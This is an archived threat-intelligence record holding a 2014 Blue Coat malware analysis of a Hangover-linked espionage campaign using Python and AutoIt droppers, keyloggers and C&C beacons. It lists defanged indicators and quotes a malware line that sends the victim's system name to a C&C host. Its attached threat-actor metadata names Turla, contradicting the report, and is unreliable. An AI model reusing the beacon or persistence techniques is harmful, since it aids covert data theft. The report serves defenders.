{
    "id": "47ee76a6-beda-4481-a09c-11ea1383ac80",
    "created_at": "2022-10-25T16:48:21.034033Z",
    "updated_at": "2025-03-27T02:05:49.008798Z",
    "deleted_at": null,
    "sha1_hash": "7132fa8920490fd6f33a464f7018fbd0baffb43b",
    "title": "Snake In The Grass: Python-based Malware Used For Targeted Attacks",
    "authors": "Bluecoat",
    "file_creation_date": "2017-02-22T05:48:20Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 714364,
    "plain_text": "# Attacks\n\n**bluecoat.com/security-blog/2014-06-10/snake-grass-python-based-malware-used-targeted-attacks**\n\n**Researchers at Blue Coat Systems have identified an intelligence-gathering campaign related to the**\n**Hangover operation detailed in 2013. The targets of this operation appear to be Pakistani and presumably**\n**represent military interests.**\n\nThe malware used for this is very simple, but uses a little used format. Instead of the programming languages most\ncommonly used for malware creation, the actors have turned to using Python, a powerful scripting language. The\nscripts were found embedded inside regular executable files designed to run Python scripts without having to install\nthe full Python package.\n\nThe inclusion of malicious scripting code in relatively mainstream installers is probably done to avoid antivirus\ndetections, and regular AV detection rates on these executables tend to be quite low. However, BlueCoat Malware\nAnalysis Appliance proactively detects these malwares with a high risk score.\nSeveral indicators point towards the same attackers as were detailed in the Norman Shark (now part of Blue Coat\nSystems) Hangover report from last year. This campaign is not the first sign of life from these actors after we\npublished our report – there have been several smaller initiatives during the autumn of 2013.\n\n## Initial malware\n\nThe initial installers of this campaign were discovered due to behavior similarities with previous Hangover-related\nmalware. These appear to have been prepared for email distribution or possibly for web download. Four such\ninstallers were identified; files with the MD5 hash of:\n\n0392fb51816dd9583f9cb206a2cf02d9, (original name Brief DG Arty-8 30 Aug.scr )\ne6d9fce2c6e766b0899ac2e1691b8097, (original name Debriefing Indian Missile Def Prg.scr)\ne013691e702778fa6dbc35b15555c3c2, (original name HQ Div Sp Eqs 21 Dec 2013 final.scr )\n9d299d3a074f2809985e0317b9c461eb, (original name HQ 19 div CTGY PLAN-Offn Objs.scr )\n\nThese are all self-extracting archives (WinRAR SFX RAR and SFX ZIP), which again contain lure documents and a\nmalicious Python installer.\n\n0392fb51816dd9583f9cb206a2cf02d9:\n\nThese files are all created using the PyInstaller tool. The “archive-viewer.py” Python script provided with the\n\n\n-----\n\nMost of the objects in these packages are legitimate libraries and components required by the installer itself. The\nhighlighted “send” object is where the malicious Python script resides.\nAnd, as Python is a human-readable format, this makes analysis straightforward:\n\n_Python function made for testing connection to Command & Control servers. Note how worldvoicetrip[.]com can_\n_supply a new C&C server (“code4”) in domain.html._\n\nThere are two main functionalities for these scripts:\n\nHarvest system information using existing system tools like systeminfo.exe. This information is attempted\nuploaded to Command & Control (C&C) server\n\n\n-----\n\n## Decoy documents\n\nThe documents accompanying the malware executables seem all related to Indian military matters. The excerpt\nbelow is labeled confidential; however the text is taken from a publicly available source at armscontrol.org.\n[(https://www.armscontrol.org/act/2013_01-02/Indian-Missile-Defense-Program-Advances)](https://www.armscontrol.org/act/2013_01-02/Indian-Missile-Defense-Program-Advances)\n\nThis document contains references to Artillery Firing Data Computing Devices (AFDCD’s), which are given to be\n**Casio FX-750 and Casio FX-880-P. However, these are models of handheld calculators from 30 years ago. They**\nare not used for military purposes today.\nAt least, I hope not.\n\n## Case expansion\n\n\n-----\n\nthreat picture. This gives information about\n\nwhat activities are ongoing\n\nagainst whom\n\nusing what tools\n\nand how to mitigate\n\nThis process involves multiple iterations of pivoting by a great deal of possible parameters – similarities in malware,\nsimilarities in network traffic, various domain registration and hosting information, passive DNS data etc.\n\nWe begin with the beginning – what we can learn from the initial malware files.\n\n**Command & Control – hosted malware**\n\nAs shown previously, the C&C servers used in these malwares were:\n\n_games-playbox[.]com_\n_worldvoicetrip[.]com_\n\nThe latter server was down by the time we noticed the malware, but games-playbox[.]com still resolved to the IP\n_176.56.238.177, belonging to AS198203 ASN-ROUTELABEL RouteLabel V.O.F. in the Netherlands. Internal and_\npublic databases show that this server has been hosting malware for download:\n\nhxxp://games-playbox[.]com/testing1/download/reg.exe\nhxxp://176.56.238.177/testing2/download/reg.exe\nhxxp://176.56.238.177/testing2/download/reg1.exe\nhxxp://176.56.238.177/testing4/download/reg.exe\nhxxp://176.56.238.177/testing2/download/winrm.exe\nhxxp://176.56.238.177/testing2/download/sppsvc.exe\nhxxp://games-playbox[.]com/winone1/download/stisvc.exe\nhxxp://games-playbox[.]com/winone1/download/sppsvc.exe\n\nBrute force testing showed that at least subfolders winone2, winone3 and winone4 contained similar content as\nwinone1.\n\n_reg.exe, reg1.exe:_\n\nThese are MINGW32 C++ (not Python) executables which have only one function – to insert a registry key that\nallows other malware to be run on startup. For example, the executable reg.exe\n(05dc62dcd4ddc9f2a79c5d23647c25c2) creates the key:\n_HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Search=C:\\dir2\\CscService.exe_\n\nThis separation of functions is likely done to avoid detection logic that triggers on software that _inserts itself into such_\nrun keys.\n\n\n-----\n\nxlsx, docx, pptx.\n\n_sppsvc.exe:_\n\nThis is a keylogger, which hooks keyboard and mouse events.\n\nIn connection with these findings we found that the same Python functionality was sometimes embedded in\nexecutable files of a slightly different format – namely py2exe. These files have a different internal structure than\nPyInstallers, but the embedded scripts can be extracted and decoded using the Python module uncompyle2.\n\nPassive DNS analysis shows that games-playbox[.]com has shared IP address with other suspicious domains:\n\nRdata results for ANY/176.56.238.177\n\ntechto-earth[.]com.    A   176.56.238.177\ngames-playbox[.]com.   A   176.56.238.177\ndownload-mgrwin[.]com.  A   176.56.238.177\n\nIndeed, techto-earth[.]com shows up in Google with an entry on the URL checking service URLQuery[.]net.\n\n\n-----\n\nThis download link (hxxp://techto-earth[.]com/eastwing/download/sppsvc.exe) was at the point of writing live, and the\ndownloaded executable (md5 c571b77469ad3c5ef336860605ee85c6) was verified as a PyInstaller-based malware.\nBrute force attempts showed that this folder also contained stisvc.exe (md5 f2a1ca02bf4a63a3d4a6c6464f5a925b)\nand reg.exe; these have same functionality as the identically named executables found on games-playbox[.]com.\nThe techto-earth[.]com domain now resolved to the IP address _81.4.125.90, similarly belonging to the Dutch_\nprovider RouteLabel.\n\nThe domain download-mgrwin[.]com which shared the IP 81.4.125.90 with techto-earth[.]com was also found to\nhost similar malware:\n\nhxxp://download-mgrwin[.]com/southside/download1/stisvc.exe\nmd5 6ec82e9eccb9bee050c9f7f2750d0c7c\n\nhxxp://download-mgrwin[.]com/southside/download1/sppsvc.exe\nmd5 acfada8e91eda6cca2da66bbb032d924\n\nhxxp://download-mgrwin[.]com/eastside/download/sppsvc.exe\nmd5 6dc9eee24f8d5cba1ca3919b87507d86\n\n**“Nick Agroyes”**\n\nDomain registration information is useful for connecting cases. Though often falsified, reuse of the same registrant\ninformation is common, thus providing a way of linking different domains.\n_download-mgrwin[.]com was registered on the email address info@communication-principals[.]com, purportedly_\nbelonging to one Nick Agroyes:\n\nThis is a faked record, but the same address was used to register other domains of which some have been\ndocumented used by malware - alertmymailsnotify[.]com, communication-principals[.]com,\nservicesprocessing[.]com and websourceing[.]com.\n\n_communication-principals[.]com: md5: 664f32f06dd7bd8c94df6edfcf6285da_\nThis is an exploited RTF file leveraging the CVE-2012-0158 RTF vulnerability which downloads a file from\n_hxxp://communication-principals[.]com/vargualm12/putty.exe_\n\n\n-----\n\n_hxxp://servicesprocessing[.]com/naspckn/plugins/wsutils.exe_\n_hxxp://servicesprocessing[.]com/naspckn/plugins/shlwapi.exe_\n_hxxp://servicesprocessing[.]com/panomasi/plugins/shlwapi.exe : md5 eeaf96b1988c7016780c0d91ce2451c8_\n_hxxp://servicesprocessing[.]com/panomasi/plugins/wsutils.exe : md5 4a9a912a8610495029ef3df813272d8a_\n\n**Other registrants**\n\nThe file 4a9a912a8610495029ef3df813272d8a has also been hosted elsewhere, on alertmymail[.]com:\n_hxxp://alertmymail[.]com/lotopoto07/plugins/wsutils.exe_\n\nThis domain is registered on the registrant sakanika@rediffmail[.]com. Other domains owned by this entity are\nnecessaries-documentation[.]com and accountsloginmail-process[.]com which show pDNS overlap with the\npreviously mentioned malicious domains.\nPassive DNS investigation and malware hosting data shows additional overlaps with the domains\nnewsfairprocessing[.]com and manufacturing-minds[.]com. These domains were registered to the registrant\n_tomhanks542@gmail[.]com._\n\nMalware referenced in relation to these domains is for example:\n\nmd5: 6f9f2e57eb06c5385f7e9370a71aa34b. This is a MINGW C++ keylogger, hosted at:\n\n_hxxp://newsfairprocessing[.]com/imopo99/plugins/rpcapd.exe_\n_hxxp://necessaries-documentation[.]com/khtergf5541/plugins/rpcapd.exe_\n\n**AutoIt**\n\nThough many of the malwares we have examined in this campaign were based on Python, a number of similar\nmalware files were found to be based on a different scripting language – AutoIt. One such malware is known under\nthe family name Emupry or AutoIt/Emupry.\n\nThe executable file “Quetta_Killings_Footage.exe” (md5 387947d5891aeb2c32f231e9abadfcec) connects to the\nknown malicious domain communication-principals[.]com. When the AutoIt script is extracted we see that important\nvariables are base64-encoded. For clarity, these have shown inline as comments below:\n\n\n-----\n\nVery similar AutoIt malware was found for the following C&C servers (domains in bold were documented in the\noriginal Hangover report):\n\n**MD5                              C&C domain**\n\n8c18852f79f14880ed9bd1d3be2fa48c  alertmymail[.]com\nddd6b9bef4d37b43484d1a0eab4753c6  alertmymail[.]com\n99f7cb87a4acbbd2aed2c4e860cd0f5a  necessaries-documentation[.]com\n04af2e8a7a1e934ab2000d701948a657  newsfairprocessing[.]com\n1f72e19999d56a11cd564d1f7b0652e7  onestop-shops[.]com\n2683e1d77b20e7aa75ade640ddb522d6  onestop-shops[.]com\n6d6fe7d36e1c43aab534644378d56dfb  westdelsys[.]com\n14a11b125f32a5a5773c23021ac4c1a1  manufacturing-minds[.]com\n84e2d98e4b3272b953b63d2021735fd3  cloudone-opsource[.]com\nfcccf9cb698297bb686561e7af7dad94  servicesprocessing[.]com\nf0ef59265610dedab40f8386af79f861  knight-quest[.]com\n\n**HTTP request format**\n\nNote the form of the HTTP requests used by this AutoIt malware: http://server/folder/online.php?sysname=.\n\nThe Python malware we mentioned first in this article constructed identical requests:\n_dfiles5 = urlopen(\"http://\"+ getserver + foldername+ \"/online.php?sysname=\"+cname+\"\")_\n\nThis request form was used in a number of Hangover-related cases as well. Given the similarities in methodology\nand targeting we consider it highly likely that the current attack malware and the Hangover infrastructures are\n\n\n-----\n\n_Above: Infrastructure map._\n\n## Conclusion\n\nThis is an operation of far smaller scope than the original Hangover infrastructure; but as more capacity is rebuilt this\nmight grow. We will keep an eye on what happens in this space.\nIt is noteworthy that they have adopted the use of scripting langauages for this type of data theft; scripts are easy to\nmaintain even by novice programmers.\n\n**Indicators: Domains**\n\naccountsloginmail-process[.]com\nalertmymail[.]com\nalertmymailsnotify[.]com\ncloudone-opsource[.]com\ncommunication-principals[.]com\ndevilcreator[.]com\ndownload-mgrwin[.]com\ngames-playbox[.]com\nknight-quest[.]com\nmanufacturing-minds[.]com\nnecessaries-documentation[.]com\nnewsfairprocessing[.]com\nonestop-shops[.]com\nservicesloginmail-process[.]com\nservicesprocessing[.]com\ntechto-earth[.]com\nwebsourceing[.]com\nwestdelsys[.]com\nworldvoicetrip[.]com\n\n\n-----\n\n213.229.64.222\n37.59.175.131\n46.32.235.162\n81.4.125.90\n\n**Indicators: Malware MD5**\n\n04af2e8a7a1e934ab2000d701948a657  a24137ea1a87b89f24ecaa0b9cb5382a\n14a11b125f32a5a5773c23021ac4c1a1  dedb56941cfaf1a650e38ba2b43c8e2b\n1f72e19999d56a11cd564d1f7b0652e7  0392fb51816dd9583f9cb206a2cf02d9\n2683e1d77b20e7aa75ade640ddb522d6  6ec82e9eccb9bee050c9f7f2750d0c7c\n387947d5891aeb2c32f231e9abadfcec  9d299d3a074f2809985e0317b9c461eb\n6d6fe7d36e1c43aab534644378d56dfb  acfada8e91eda6cca2da66bbb032d924\n84e2d98e4b3272b953b63d2021735fd3  c571b77469ad3c5ef336860605ee85c6\n8c18852f79f14880ed9bd1d3be2fa48c  e013691e702778fa6dbc35b15555c3c2\n99f7cb87a4acbbd2aed2c4e860cd0f5a  e6d9fce2c6e766b0899ac2e1691b8097\na8bc0a09b5ee1e9ff40eac10ba0d43ed  f2a1ca02bf4a63a3d4a6c6464f5a925b\nddd6b9bef4d37b43484d1a0eab4753c6  0739e1aea8c2928b9d1b3bcd145e0bcb\nf0ef59265610dedab40f8386af79f861  4a9a912a8610495029ef3df813272d8a\nfcccf9cb698297bb686561e7af7dad94  eeaf96b1988c7016780c0d91ce2451c8\n05dc62dcd4ddc9f2a79c5d23647c25c2  f5d4664a607386c342fdd3358ea38962\n349583df5921e3d9fca9d4864072f6ca  f68eb7db21cd8abf5f60b16ca6c6a5e7\n6f9f2e57eb06c5385f7e9370a71aa34b  664f32f06dd7bd8c94df6edfcf6285da\n8dbadff3529ca03b8d453a7c9aaf3c6c  6dc9eee24f8d5cba1ca3919b87507d86\n\nPassive DNS data used for this article were provided by Farsight Security, Inc.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/4n263mzodo4mb7jz1w3deidg9xuu2teh"
    ],
    "report_names": [
        "Bluecoat_SnakeInTheGrass-Python-Malware-Targeted(06-10-2014)"
    ],
    "threat_actors": [
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041149,
    "ts_creation_date": 1487742500,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/7132fa8920490fd6f33a464f7018fbd0baffb43b.pdf",
        "text": "https://archive.orkl.eu/7132fa8920490fd6f33a464f7018fbd0baffb43b.txt",
        "img": "https://archive.orkl.eu/7132fa8920490fd6f33a464f7018fbd0baffb43b.jpg"
    }
}